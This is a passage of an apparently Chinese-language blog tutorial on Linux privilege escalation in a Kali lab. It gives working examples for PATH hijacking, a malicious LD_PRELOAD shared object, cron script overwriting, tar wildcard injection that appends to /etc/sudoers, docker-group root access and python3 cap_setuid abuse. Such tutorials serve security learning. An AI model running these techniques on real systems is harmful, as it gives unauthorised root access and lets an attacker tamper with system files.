class="line">┌──(kali㉿kali)-[~/桌面]</span><br><span class="line">└─$ ./whoami_shell     </span><br><span class="line"></span><br><span class="line">┌──(root㉿kali)-[~/桌面]</span><br><span class="line">└─#       </span><br></pre></td></tr></table></figure>

<p>过程：root给一个可执行文件赋予了suid，而此文件又调用了一个环境变量的命令，这时修改PATH把tmp添加到头的位置，系统再执行就会先去tmp目录下找，tmp目录下放的是恶意程序，从而导致恶意程序以root权限运行。</p>
<p>注意，用<code>export PATH=/tmp:$PATH</code>改变PATH只在此次终端才有效，对其他终端无效</p>
<h3 id="LD-PRELOAD提权"><a href="#LD-PRELOAD提权" class="headerlink" title="LD_PRELOAD提权"></a>LD_PRELOAD提权</h3><p><code>LD_PRELOAD</code>是Linux下的一个环境变量，程序运行时都会加载一些so文件，类似于windows下程序加载dll，而LD_PRELOAD可以指定程序运行前加载的动态连接库。</p>
<p>测试前先按如下配置一下sudoers文件，以zixyd用户为例，添加一个find命令和一个LD_PRELOAD。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">zixyd   ALL=(ALL:ALL) NOPASSWD:/usr/bin/find</span><br><span class="line"></span><br><span class="line">Defaults        env_keep += LD_PRELOAD</span><br></pre></td></tr></table></figure>

<p>这里记录下<code>env_keep</code>的说明。</p>
<p>例如aaa用户有一个aaa_pach的环境变量，当通过su切换到bbb用户时，再查看env环境变量，aaa_pach就没有了，也就意味着用户的切换不会带着环境变量一块切过去。而想保持某个环境不受用户切换的影响，那么可以在sudoers文件中设置env_keep。</p>
<p>如果并设置<code>Defaults        env_keep += LD_PRELOAD</code>,会报错</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">┌──(zixyd㉿kali)-[~]</span><br><span class="line">└─$ sudo LD_PRELOAD=ld_preload_shell_test find </span><br><span class="line">sudo: 对不起，您无权设置以下环境变量：LD_PRELOAD</span><br></pre></td></tr></table></figure>

<p>切换回普通用户，查看sudo权限。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">┌──(zixyd㉿kali)-[~]</span><br><span class="line">└─$ sudo -l                                                                                                                              </span><br><span class="line">匹配 kali 上 zixyd 的默认条目：</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, env_keep+=LD_PRELOAD, use_pty</span><br><span class="line"></span><br><span class="line">用户 zixyd 可以在 kali 上运行以下命令：</span><br><span class="line">    (ALL : ALL) NOPASSWD: /usr/bin/find</span><br></pre></td></tr></table></figure>

<p>我们有一个find的sudo权，且env_keep中定义了LD_PRELOAD，那么我们就可以定义一个恶意的so文件，然后sudo运行find时指定LD_PRELOAD来加载我们自己的so文件，就可以实现提权。</p>
<p>so文件的c代码如下。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> _init() &#123; </span><br><span class="line">        unsetenv(<span class="string">&quot;LD_PRELOAD&quot;</span>);</span><br><span class="line">        setgid(<span class="number">0</span>);</span><br><span class="line">        setuid(<span class="number">0</span>);</span><br><span class="line">        system(<span class="string">&quot;/bin/bash&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后进行编译-fPIC -shared参数简单理解就是动态编辑共享库，可以进行公共调用，nostartfiles参数代表该库运行不会去调用系统的其它库，避免影响自己的程序执行。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc ld_preload_shell.c -fPIC -shared -o shell.so -nostartfiles</span><br></pre></td></tr></table></figure>

<p>编译后我们使用sudo运行find并指定LD_PRELOAD为我们编译的shell.so文件，这时find就会先调用shell.so，导致我们的代码被执行，返回的权限为root。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">┌──(zixyd㉿kali)-[~]</span><br><span class="line">└─$ sudo LD_PRELOAD=/home/zixyd/shell.so find        #似乎只能用绝对路径，系统默认的共享库目录（比如/lib和/usr/lib）                                                                  </span><br><span class="line">┌──(root㉿kali)-[/home/zixyd]</span><br><span class="line">└─#        </span><br></pre></td></tr></table></figure>

<p>思考：</p>
<p>再sudo提权时可以用到<code>LD_PRELOAD</code>，那么suid行不行呢？我用suid没有成功</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">┌──(zixyd㉿kali)-[~]</span><br><span class="line">└─$ ll /usr/bin/cp</span><br><span class="line">-rwsr-xr-x 1 root root 151152 2022年 9月20日 /usr/bin/cp</span><br><span class="line"></span><br><span class="line">┌──(zixyd㉿kali)-[~]</span><br><span class="line">└─$ LD_PRELOAD=/home/zixyd/shell.so cp /etc/passwd ./</span><br><span class="line"></span><br><span class="line">┌──(zixyd㉿kali)-[~] #并没有切换到root</span><br><span class="line">└─$      </span><br></pre></td></tr></table></figure>

<p>注意点：如果使用自己攻击机编译的so文件，传到目标机可能普通用户没有执行权限，这时需要加下权限。如果目标机支持gcc编译，也可以直接在目标机编译。</p>
<p><strong>总结</strong></p>
<p>使用情况就是<code>sudoers</code>中的<code>env_keep</code>定义了<code>LD_PRELOAD</code>，然后<code>sudo</code>有相关的命令，那么sudo运行命令时就可以通过LD_PRELOAD来指定恶意so文件。</p>
<h3 id="cronjobs提权"><a href="#cronjobs提权" class="headerlink" title="cronjobs提权"></a>cronjobs提权</h3><p>cronjobs是定时任务，在特定的日期和时间执行计划任务。例如定期备份或者定期清理某个目录等都会用到，定义格式如下：</p>
<p><img src="https://cdn.jsdelivr.net/gh/zIxyd/image@main/ctfshow/asdfadddd0.png"></p>
<h4 id="文件覆盖"><a href="#文件覆盖" class="headerlink" title="文件覆盖"></a><strong>文件覆盖</strong></h4><p>这里以root用户创建一下测试环境，首先创建一个cron，运行一个脚本，该脚本功能是定时清除特定文件，例如&#x2F;tmp&#x2F;test。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/桌面]</span><br><span class="line">└─$ echo &quot;just_test&quot; &gt;　/tmp/test </span><br></pre></td></tr></table></figure>

<p>创建clear.py脚本，并赋可执行权限<code>chmod +x /tmp/clear.py</code></p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    os.system(<span class="string">&quot;rm -rf /tmp/test&quot;</span>)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    sys.exit()</span><br></pre></td></tr></table></figure>

<p>修改<code>crontab </code>文件，每分钟以root身份执行一次&#x2F;tmp&#x2F;clear.py文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo vim /etc/crontab </span><br><span class="line"></span><br><span class="line">*/1 *   * * *   root    /tmp/clear.py</span><br></pre></td></tr></table></figure>



<p><strong>提权：</strong></p>
<p>如果可以修改定时任务的文件(clear.py)，就可以提权，例如将上面的**&#x2F;tmp&#x2F;clear.py**修改内容如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    os.system(<span class="string">&quot;rm -rf /tmp/test&quot;</span>)</span><br><span class="line">    os.system(<span class="string">&quot;chmod u+s /bin/bash&quot;</span>)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    sys.exit()</span><br></pre></td></tr></table></figure>

<p>在执行<code>/bin/bash -p</code>命令即可得到root权限，-p参数在本文章上面有解释；</p>
<h4 id="通配符注入"><a href="#通配符注入" class="headerlink" title="通配符注入"></a><strong>通配符注入</strong></h4><p>而在操作过程中，如果有文件名的名字是一个参数，那么执行过程中，就会被当作参数运行。例如一个目录下有一个叫–help的文件，当cat查看该文件内容时，实际上确是cat的帮助信息。</p>
<p>常见的定时任务除了定时清除文件外，定时压缩也会很常见，例如有一个定时任务，每分钟回去执行<code>/var/www/html/crontab.sh</code>脚本，该脚本是备份html网站，脚本内容如下。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line">cd /var/www/html/</span><br><span class="line">tar -zvcf /var/backups/html.tar *</span><br></pre></td></tr></table></figure>

<p>修改<code>/etc/crontab</code>：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*/1 *   * * *   root    /var/www/html/crontab.sh</span><br></pre></td></tr></table></figure>

<p>查看是否备份成功</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[/var/backups]</span><br><span class="line">└─$ cd /var/backups </span><br><span class="line"></span><br><span class="line">┌──(kali㉿kali)-[/var/backups]</span><br><span class="line">└─$ ll</span><br><span class="line">总计 4</span><br><span class="line">-rw-r--r-- 1 root root 3621 12月 8日 09:52 html.tar</span><br></pre></td></tr></table></figure>

<p>在tar命令中有一个<code>checkpoint</code>参数，即检查点，比如checkpoint&#x3D;1，则代表压缩过程中每压缩一个文件就去执行一个检查操作。</p>
<p>而这个检查操作的参数是<code>--checkpoint-action=exec=</code>，后面可以跟要执行的命令。</p>
<p>利用思路就是我们写入一个sh脚本，该脚本作用是<strong>修改sudoers</strong>文件，把当前用户添加进去，获得sudo所有权，从而进行提权。然后利用checkpoint-action&#x3D;exec&#x3D;接一个执行sh脚本的命令即可。</p>
<p>利用过程：首先创建两个文件，名字为参数名，然后再创建一个sh脚本，内容为向sudoers追加权限，相关命令如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">echo &#x27;echo &quot;zixyd ALL=(root) NOPASSWD: ALL&quot; &gt;&gt; /etc/sudoers&#x27; &gt; test.sh</span><br><span class="line">echo &quot;&quot; &gt; --checkpoint=1</span><br><span class="line">echo &quot;&quot; &gt; &quot;--checkpoint-action=exec=sh test.sh&quot;</span><br></pre></td></tr></table></figure>

<p>等待一分钟后，sudoers就会被追加zixyd用户的权限</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sudo cat /etc/sudoers</span><br><span class="line">#每分钟 都会往/etc/sudoers添加一句</span><br><span class="line">zixyd ALL=(root) NOPASSWD: ALL</span><br><span class="line">zixyd ALL=(root) NOPASSWD: ALL</span><br><span class="line">zixyd ALL=(root) NOPASSWD: ALL</span><br><span class="line">zixyd ALL=(root) NOPASSWD: ALL</span><br></pre></td></tr></table></figure>



<h3 id="docker提权"><a href="#docker提权" class="headerlink" title="docker提权"></a>docker提权</h3><p>在docker中，是允许访问root用户和docker组中的其它用户的，测试如下,(这句话表达的不是很清楚，大概意思就是只要用户在docker组下，就可以未授权访问root用户和docker组中的其他用户)</p>
<p>需要将用户添加到docker组中</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">usermod -G docker kali</span><br></pre></td></tr></table></figure>

<p>这里有意思的是，我没有输入这条命令，我在我的kali用户已经是dockr组了(意思就是我没有设置实验环境，我的kali机器已经存在可以提权的点了)</p>
<p>上网找原因：在某些Linux系统中，安装Docker后会自动创建一个名为”docker”的用户组，并将当前用户加入该组，以便用户可以在不使用sudo的情况下运行Docker命令。这通常是Docker安装过程中的默认行为。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/桌面]</span><br><span class="line">└─$ groups kali</span><br><span class="line">kali : kali adm dialout cdrom floppy sudo audio dip video plugdev users netdev wireshark bluetooth scanner kaboxer docker</span><br><span class="line"></span><br><span class="line">┌──(kali㉿kali)-[~/桌面]</span><br><span class="line">└─$ cat /etc/group | grep &quot;docker&quot;     </span><br><span class="line">docker:x:993:kali</span><br></pre></td></tr></table></figure>

<p>随后使用docker run来允许alpine镜像，v参数进行挂载，是将宿主机的root目录挂载到alpine的mnt下，使用冒号分隔。i参数是保持打开状态，t参数是分配一个tty终端，it一般结合使用，即保持通讯终端的打开。</p>
<p>这时访问<code>docker</code>镜像alpine，就相当于访问宿主机的root目录，权限变成了root,可以执行任意命令</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/桌面]</span><br><span class="line">└─$ docker run -v /root:/mnt -it alpine       </span><br><span class="line">/ # cd /mnt</span><br><span class="line">/mnt # whoami</span><br><span class="line">root</span><br></pre></td></tr></table></figure>



<h3 id="capability提权"><a href="#capability提权" class="headerlink" title="capability提权"></a>capability提权</h3><p>capability翻译为能力的意思，linux中能力的概念和suid类似，是用来让普通用户也可以做超级用户的工作，从而设置的一个机制，原来linux分的是普通用户和超级用户，后来加了能力，即赋予某某账号能力，这个账号有能力了，就可以去做事了。</p>
<p>capability可分割root权限，把root特权分割成不同的能力，然后给与普通用户不同的能力，每一种能力都代表着一种特权。下面是一些能力参考：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">- CAP_CHOWN:修改文件属主的权限</span><br><span class="line"></span><br><span class="line">- CAP_DAC_OVERRIDE:忽略文件的DAC访问限制</span><br><span class="line"></span><br><span class="line">- CAP_DAC_READ_SEARCH:忽略文件读及目录搜索的DAC访问限制</span><br><span class="line"></span><br><span class="line">- CAP_FOWNER：忽略文件属主ID必须和进程用户ID相匹配的限制</span><br><span class="line"></span><br><span class="line">- CAP_FSETID:允许设置文件的setuid位</span><br><span class="line"></span><br><span class="line">- CAP_KILL:允许对不属于自己的进程发送信号</span><br><span class="line"></span><br><span class="line">- CAP_SETGID:允许改变进程的组ID</span><br><span class="line"></span><br><span class="line">- CAP_SETUID:允许改变进程的用户ID</span><br><span class="line"></span><br><span class="line">- CAP_SETPCAP:允许向其他进程转移能力以及删除其他进程的能力</span><br><span class="line"></span><br><span class="line">- CAP_LINUX_IMMUTABLE:允许修改文件的IMMUTABLE和APPEND属性标志</span><br><span class="line"></span><br><span class="line">- CAP_NET_BIND_SERVICE:允许绑定到小于1024的端口</span><br><span class="line"></span><br><span class="line">- CAP_NET_BROADCAST:允许网络广播和多播访问</span><br><span class="line"></span><br><span class="line">- CAP_NET_ADMIN:允许执行网络管理任务</span><br><span class="line"></span><br><span class="line">- CAP_NET_RAW:允许使用原始套接字</span><br><span class="line"></span><br><span class="line">- CAP_IPC_LOCK:允许锁定共享内存片段</span><br><span class="line"></span><br><span class="line">- CAP_IPC_OWNER:忽略IPC所有权检查</span><br><span class="line"></span><br><span class="line">- CAP_SYS_MODULE:允许插入和删除内核模块</span><br><span class="line"></span><br><span class="line">- CAP_SYS_RAWIO:允许直接访问/devport,/dev/mem,/dev/kmem及原始块设备</span><br><span class="line"></span><br><span class="line">- CAP_SYS_CHROOT:允许使用chroot()系统调用</span><br><span class="line"></span><br><span class="line">- CAP_SYS_PTRACE:允许跟踪任何进程</span><br><span class="line"></span><br><span class="line">- CAP_SYS_PACCT:允许执行进程的BSD式审计</span><br><span class="line"></span><br><span class="line">- CAP_SYS_ADMIN:允许执行系统管理任务，如加载或卸载文件系统、设置磁盘配额等</span><br><span class="line"></span><br><span class="line">- CAP_SYS_BOOT:允许重新启动系统</span><br><span class="line"></span><br><span class="line">- CAP_SYS_NICE:允许提升优先级及设置其他进程的优先级</span><br><span class="line"></span><br><span class="line">- CAP_SYS_RESOURCE:忽略资源限制</span><br><span class="line"></span><br><span class="line">- CAP_SYS_TIME:允许改变系统时钟</span><br><span class="line"></span><br><span class="line">- CAP_SYS_TTY_CONFIG:允许配置TTY设备</span><br><span class="line"></span><br><span class="line">- CAP_MKNOD:允许使用mknod()系统调用</span><br><span class="line"></span><br><span class="line">- CAP_LEASE:允许修改文件锁的FL_LEASE标志</span><br></pre></td></tr></table></figure>

<p>在设置程序能力时，有三个选项可选：</p>
<p>1，inheritable，简称i，表示是否可继承。</p>
<p>2，permitted，简称p，表示是否允许使用。</p>
<p>3，effective，简称e，表示特权是否有效。</p>
<p>setcap命令用来设置能力，例如<code>setcap cap_setuid+ep /home/demo/python3</code>，就表示<code>home/demo/python3</code>这个程序添加了setuid能力，即改变进程uid的能力，+ep就表示能力有效，且允许使用。</p>
<p><strong>capability测试</strong></p>
<p>setcap设置能力，getcat读取能力。</p>
<p>getcap通过r参数来读取指定目录下有能力的程序。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[/tmp]</span><br><span class="line">└─$ echo &quot;capability&quot; &gt; capability   </span><br><span class="line"></span><br><span class="line">┌──(kali㉿kali)-[/tmp]</span><br><span class="line">└─$ sudo setcap cap_setuid+ep /tmp/capability</span><br><span class="line"></span><br><span class="line">┌──(kali㉿kali)-[/tmp]</span><br><span class="line">└─$ getcap -r /tmp 2&gt;/dev/null </span><br><span class="line">/tmp/capability cap_setuid=ep</span><br></pre></td></tr></table></figure>

<p>能力滥用导致的提权</p>
<p>例如管理员要为python3程序(其他程序类似)设置超级权限给zixyd用户，但没有用suid或sudo授权，而用的是<code>capabilities</code>，通过的是以下命令来设置的。</p>
<p>因为root只想给zixyd用户的python3能力，所以这里是将程序复制到了zixyd用户下，如果直接设置bin下的python3程序，那么意味着任何用户都具有了相关能力</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">┌──(zixyd㉿kali)-[~]</span><br><span class="line">└─$ cp /usr/bin/python3 .</span><br><span class="line"></span><br><span class="line">┌──(zixyd㉿kali)-[~]</span><br><span class="line">└─$ sudo setcap cap_setuid+ep ./python3</span><br><span class="line"></span><br><span class="line">┌──(zixyd㉿kali)-[~]</span><br><span class="line">└─$ ls -l</span><br><span class="line">-rwxr-xr-x 1 root  zixyd 6754136 12月 8日 13:19 python3</span><br><span class="line"></span><br><span class="line">┌──(zixyd㉿kali)-[~]</span><br><span class="line">└─$ getcap -r ./ 2&gt;/dev/null</span><br><span class="line">./python3 cap_setuid=ep</span><br><span class="line"></span><br><span class="line">┌──(zixyd㉿kali)-[~]</span><br><span class="line">└─$ ./python3 -c &quot;import os; os.setuid(0); os.system(&#x27;/bin/bash&#x27;)&quot;</span><br><span class="line"></span><br><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# whoami</span><br><span class="line">root</span><br></pre></td></tr></table></figure>







</p></div><div class="post-footer"><div class="tip">All rights reserved<br>Author: zIxyd</div><div class="meta"><div class="info"><i class="fa fa-sun-o"></i><span class="date">2023-12-07</span><span class="leancloud_visitors"></span><span>About 6270 words, 20 min 54 sec  read</span></div></div></div></div><div class="share"><div class="evernote"><a class="fa fa-bookmark" href="" onclick="javascript:join_favorite()" ref="sidebar"></a></div><div class="weibo"><a class="fa fa-weibo" href="javascript:void((function(s,d,e){try{}catch(e){}var f='http://service.weibo.com/share/share.php?',u=d.location.href,p=['url=',e(u),'&amp;title=',e(d.title),'&amp;appkey=2924220432'].join('');function a(){if(!window.open([f,p].join(''),'mb',['toolbar=0,status=0,resizable=1,width=620,height=450,left=',(s.width-620)/2,',top=',(s.height-450)/2].join('')))u.href=[f,p].join('');};if(/Firefox/.test(navigator.userAgent)){setTimeout(a,0)}else{a()}})(screen,document,encodeURIComponent));"></a></div><div class="twitter"><a class="fa fa-twitter" target="_blank" rel="noopener" href="http://twitter.com/intent/tweet?text=I%20have%20found%20a%20great%20blog.%0A%0AzIxyd's%20Blog%20%C2%B7%20Linux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93%0Ahttps://zIxyd.github.io/2023/12/07/Linux%E6%8F%90%E6%9D%83/%0A"></a></div></div><div class="pagination"><ul class="clearfix"><li class="next pagbuttons"><a class="btn" role="navigation" href="/2023/11/26/Geek%20Challenge%202023/" title="Geek Challenge 2023">Next</a></li></ul></div><script src="/js/visitors.js"></script></div></div></div></div><script src="/js/darkLightToggle.js"></script><script src="/js/jquery-migrate-1.2.1.min.js"></script><script src="/js/jquery.appear.js"></script><script src="/js/add-bookmark.js"></script><script>(function(window){var INSIGHT_CONFIG={TRANSLATION:{POSTS:"Posts",PAGES:"Pages",CATEGORIES:"Categories",TAGS:"Tags",UNTITLED:"(Untitled)",},CONTENT_URL:"/content.json",};window.INSIGHT_CONFIG=INSIGHT_CONFIG})(window);</script><script src="/js/insight.js" defer></script><div class="searchbox ins-search"><div class="searchbox-container ins-search-container"><div class="searchbox-input-wrapper"><input class="searchbox-input ins-search-input" type="text" placeholder="Search..."><span class="searchbox-close"><a class="fa fa-times-circle" onclick="closeWindow();"></a></span></div><div class="searchbox-result-wrapper ins-section-wrapper"><div class="ins-section-container"><p>Seraching...</p></div></div></div></div></body></html>